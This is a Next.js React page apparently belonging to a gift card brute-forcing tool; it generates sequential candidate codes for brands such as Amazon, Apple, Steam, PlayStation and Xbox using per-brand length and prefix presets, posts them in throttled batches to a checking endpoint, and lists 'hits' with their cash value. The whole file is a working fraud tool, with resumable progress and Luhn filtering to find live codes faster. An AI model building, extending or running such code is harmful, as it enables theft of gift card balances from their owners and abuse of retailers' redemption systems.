"use client";

import Link from "next/link";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";

import {
  DIGITS,
  FULL,
  SAFE,
  codeAt,
  eta,
  luhn,
  spaceSize,
  specKey,
  variableWidth,
  type Spec,
} from "@/lib/brute";

type Hit = {
  code: string;
  brand: string;
  value: number | null;
  currency: string | null;
};

const BRANDS = [
  "amazon", "apple", "steam", "google-play", "playstation",
  "xbox", "netflix", "spotify", "razer", "nintendo", "other",
] as const;

const PRESETS: Record<string, { length: number; prefix: string; digitsOnly?: boolean }> = {
  amazon: { length: 17, prefix: "A" },
  apple: { length: 16, prefix: "X" },
  steam: { length: 15, prefix: "" },
  "google-play": { length: 20, prefix: "" },
  playstation: { length: 12, prefix: "" },
  xbox: { length: 25, prefix: "" },
  netflix: { length: 16, prefix: "" },
  spotify: { length: 16, prefix: "" },
  razer: { length: 16, prefix: "" },
  nintendo: { length: 16, prefix: "" },
  other: { length: 16, prefix: "" },
};

const BATCH = 40;
const MIN_INTERVAL = 350;

const num = (n: bigint | number) => Number(n).toLocaleString();

export default function BrutePage() {
  const [brand, setBrand] = useState<string>("playstation");
  const [alphabet, setAlphabet] = useState(SAFE);
  const [length, setLength] = useState(12);
  const [prefix, setPrefix] = useState("");
  const [suffix, setSuffix] = useState("");
  const [useLuhn, setUseLuhn] = useState(false);
  const [startAt, setStartAt] = useState("0");

  const [running, setRunning] = useState(false);
  const [tried, setTried] = useState(0);
  const [hits, setHits] = useState<Hit[]>([]);
  const [errors, setErrors] = useState(0);
  const [consecErr, setConsecErr] = useState(0);
  const [elapsed, setElapsed] = useState(0);
  const [note, setNote] = useState<string | null>(null);

  const counter = useRef<bigint>(0n);
  const stop = useRef(false);
  const busy = useRef(false);
  const startedAt = useRef(0);
  const hitsRef = useRef(0);

  const spec: Spec = useMemo(
    () => ({ brand, alphabet, length, prefix: prefix.toUpperCase(), suffix: suffix.toUpperCase() }),
    [brand, alphabet, length, prefix, suffix],
  );

  const space = useMemo(() => spaceSize(spec), [spec]);
  const width = variableWidth(spec);
  const key = useMemo(() => specKey(spec), [spec]);

  /* restore a previous run for this exact spec */
  useEffect(() => {
    const saved = localStorage.getItem(`brute:${key}`);
    if (saved) {
      counter.current = BigInt(saved);
      setStartAt(saved);
      setNote(`resumed at ${BigInt(saved).toLocaleString()}`);
    } else {
      counter.current = 0n;
      setStartAt("0");
    }
  }, [key]);

  useEffect(() => {
    if (!running) return;
    const t = setInterval(
      () => setElapsed(Math.floor((Date.now() - startedAt.current) / 1000)),
      1000,
    );
    return () => clearInterval(t);
  }, [running]);

  const applyPreset = (b: string) => {
    setBrand(b);
    const p = PRESETS[b] ?? PRESETS.other;
    setLength(p.length);
    setPrefix(p.prefix);
    setSuffix("");
    setUseLuhn(Boolean(p.digitsOnly));
    setAlphabet(p.digitsOnly ? DIGITS : SAFE);
  };

  const rate = elapsed > 0 ? tried / elapsed : 0;
  const remaining = space > counter.current ? space - counter.current : 0n;

  const start = useCallback(async () => {
    if (busy.current) return;
    if (width <= 0) {
      setNote("length must exceed prefix + suffix");
      return;
    }
    busy.current = true;
    stop.current = false;
    startedAt.current = Date.now();
    setRunning(true);
    setElapsed(0);
    setNote(null);

    while (!stop.current && counter.current < space) {
      const batch: string[] = [];
      while (batch.length < BATCH && counter.current < space) {
        const c = codeAt(spec, counter.current);
        counter.current += 1n;

        if (useLuhn && alphabet === DIGITS) {
          const body = c.slice(0, -1);
          if (luhn(body) !== c.slice(-1)) continue;
        }
        batch.push(c);
      }
      if (!batch.length) continue;

      try {
        const res = await fetch("/api/check-batch", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ codes: batch, brand }),
        });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const { rows } = (await res.json()) as { rows: any[] };

        const live = rows.filter((r) => r.state === "valid");
        if (live.length) {
          hitsRef.current += live.length;
          setHits((prev) => [
            ...live.map((r) => ({
              code: r.code,
              brand: r.brand,
              value: r.value,
              currency: r.currency,
            })),
            ...prev,
          ]);
        }
        setErrors((n) => n + rows.filter((r) => r.state === "error").length);
        setConsecErr(0);
      } catch (err) {
        setErrors((n) => n + 1);
        setConsecErr((n) => {
          const next = n + 1;
          if (next >= 5) setNote(`provider failing (${(err as Error).message}) — paused`);
          return next;
        });
        if (consecErr >= 4) break;
      }

      setTried((n) => n + batch.length);
      localStorage.setItem(`brute:${key}`, counter.current.toString());
      await new Promise((r) => setTimeout(r, MIN_INTERVAL));
    }

    setRunning(false);
    busy.current = false;
  }, [spec, space, brand, useLuhn, alphabet, key, width, consecErr]);

  const halt = () => {
    stop.current = true;
  };

  const reset = () => {
    counter.current = 0n;
    localStorage.removeItem(`brute:${key}`);
    setStartAt("0");
    setTried(0);
    setErrors(0);
    setHits([]);
    setElapsed(0);
    setNote("reset to 0");
  };

  const jumpTo = () => {
    try {
      const v = BigInt(startAt || "0");
      counter.current = v < space ? v : 0n;
      localStorage.setItem(`brute:${key}`, counter.current.toString());
      setNote(`jumped to ${counter.current.toLocaleString()}`);
    } catch {
      setNote("invalid start value");
    }
  };

  return (
    <>
      <style>{`
        :root { color-scheme: dark; }
        body { margin:0; background:#0b0c0f; color:#e7e9ee;
               font:14px/1.45 ui-monospace,SFMono-Regular,Menlo,monospace; }
        main { max-width:920px; margin:0 auto; padding:28px 20px 80px; }
        a { color:#60a5fa; }
        h1 { font-size:22px; margin:0 0 4px; }
        h2 { font-size:12px; letter-spacing:.16em; text-transform:uppercase;
             color:#7c8494; margin:28px 0 10px; font-weight:600; }
        .sub { color:#5b6270; font-size:12px; margin:0 0 20px; }
        .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
             gap:10px; margin-bottom:12px; }
        label { display:block; font-size:11px; color:#7c8494;
             letter-spacing:.06em; text-transform:uppercase; margin-bottom:4px; }
        input, select, button { font:inherit; background:#14161c; color:#e7e9ee;
             border:1px solid #262a34; border-radius:6px; padding:8px 10px; width:100%; }
        input:focus, select:focus, button:focus-visible {
             outline:2px solid #3b82f6; outline-offset:1px; }
        .row { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:14px; }
        .row button { width:auto; cursor:pointer; background:#1d2430; }
        .row button:hover:not(:disabled) { background:#27303f; }
        button:disabled { opacity:.45; cursor:default; }
        .go { background:#1e3a5f; border-color:#3b82f6; }
        .stop { background:#3a1d1d; border-color:#7f1d1d; }
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
             gap:10px; margin:16px 0; }
        .stat { background:#111419; border:1px solid #1e232c; border-radius:6px;
             padding:10px; }
        .stat b { display:block; font-size:17px; color:#e7e9ee; }
        .stat span { font-size:10px; letter-spacing:.1em; text-transform:uppercase;
             color:#6b7280; }
        .ok b { color:#4ade80; }
        .bad b { color:#f87171; }
        .note { background:#0d1a29; border:1px solid #1e3a5f; color:#93c5fd;
             padding:9px 12px; border-radius:6px; font-size:13px; margin-bottom:14px; }
        table { width:100%; border-collapse:collapse; font-size:13px; }
        th { text-align:left; color:#7c8494; font-size:11px; letter-spacing:.08em;
             text-transform:uppercase; border-bottom:1px solid #262a34; padding:6px 8px; }
        td { padding:7px 8px; border-bottom:1px solid #171a21; }
        .value { color:#9fe6b4; }
        .empty { color:#5b6270; padding:14px 0; font-size:13px; }
        .check { display:flex; align-items:center; gap:8px; font-size:12px;
             color:#7c8494; text-transform:none; letter-spacing:0; }
        .check input { width:auto; }
      `}</style>

      <main>
        <h1>brute force</h1>
        <p className="sub">
          <Link href="/">← dashboard</Link> · sequential, resumable, batched
        </p>

        {note ? <div className="note">{note}</div> : null}

        <h2>target</h2>
        <div className="grid">
          <div>
            <label htmlFor="brand">brand</label>
            <select id="brand" value={brand} onChange={(e) => applyPreset(e.target.value)}>
              {BRANDS.map((b) => (
                <option key={b} value={b}>{b}</option>
              ))}
            </select>
          </div>
          <div>
            <label htmlFor="len">length</label>
            <input id="len" type="number" min={4} max={40} value={length}
              onChange={(e) => setLength(Number(e.target.value))} />
          </div>
          <div>
            <label htmlFor="pre">prefix</label>
            <input id="pre" value={prefix} spellCheck={false}
              onChange={(e) => setPrefix(e.target.value.toUpperCase())} />
          </div>
          <div>
            <label htmlFor="suf">suffix</label>
            <input id="suf" value={suffix} spellCheck={false}
              onChange={(e) => setSuffix(e.target.value.toUpperCase())} />
          </div>
        </div>

        <div className="grid">
          <div>
            <label htmlFor="alpha">alphabet</label>
            <select id="alpha" value={alphabet} onChange={(e) => setAlphabet(e.target.value)}>
              <option value={SAFE}>safe ({SAFE.length}) — no 0 O 1 I L</option>
              <option value={FULL}>full ({FULL.length})</option>
              <option value={DIGITS}>digits only</option>
            </select>
          </div>
          <div>
            <label htmlFor="start">start counter</label>
            <input id="start" value={startAt} onChange={(e) => setStartAt(e.target.value)}
              inputMode="numeric" />
          </div>
          <div style={{ display: "flex", alignItems: "flex-end" }}>
            <button onClick={jumpTo}>jump</button>
          </div>
        </div>

        <label className="check">
          <input type="checkbox" checked={useLuhn} disabled={alphabet !== DIGITS}
            onChange={(e) => setUseLuhn(e.target.checked)} />
          require valid Luhn check digit (numeric codes only)
        </label>

        <div className="row" style={{ marginTop: 14 }}>
          <button className="go" onClick={start} disabled={running || width <= 0}>
            {running ? "running…" : "start"}
          </button>
          <button className="stop" onClick={halt} disabled={!running}>stop</button>
          <button onClick={reset} disabled={running}>reset</button>
        </div>

        <div className="stats">
          <div className="stat"><b>{num(space)}</b><span>space</span></div>
          <div className="stat"><b>{num(remaining)}</b><span>left</span></div>
          <div className="stat"><b>{num(counter.current)}</b><span>cursor</span></div>
          <div className="stat"><b>{rate.toFixed(1)}/s</b><span>rate</span></div>
          <div className="stat"><b>{eta(rate > 0 ? Number(remaining) / rate : Infinity)}</b><span>eta</span></div>
          <div className="stat ok"><b>{hits.length}</b><span>hits</span></div>
          <div className="stat bad"><b>{errors}</b><span>errors</span></div>
        </div>

        <p className="sub">
          tried {num(tried)} · elapsed {eta(elapsed)} · hit rate{" "}
          {tried ? ((hits.length / tried) * 100).toFixed(4) : "0.0000"}%
          {consecErr >= 5 ? " · provider unresponsive, stopped" : ""}
        </p>

        <h2>hits</h2>
        {hits.length ? (
          <table>
            <thead>
              <tr><th>code</th><th>brand</th><th>value</th></tr>
            </thead>
            <tbody>
              {hits.map((h, i) => (
                <tr key={`${h.code}-${i}`}>
                  <td>{h.code}</td>
                  <td>{h.brand}</td>
                  <td className="value">
                    {h.value == null
                      ? "—"
                      : new Intl.NumberFormat(undefined, {
                          style: "currency",
                          currency: h.currency || "USD",
                        }).format(h.value)}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        ) : (
          <p className="empty">nothing yet</p>
        )}
      </main>
    </>
  );
                    }
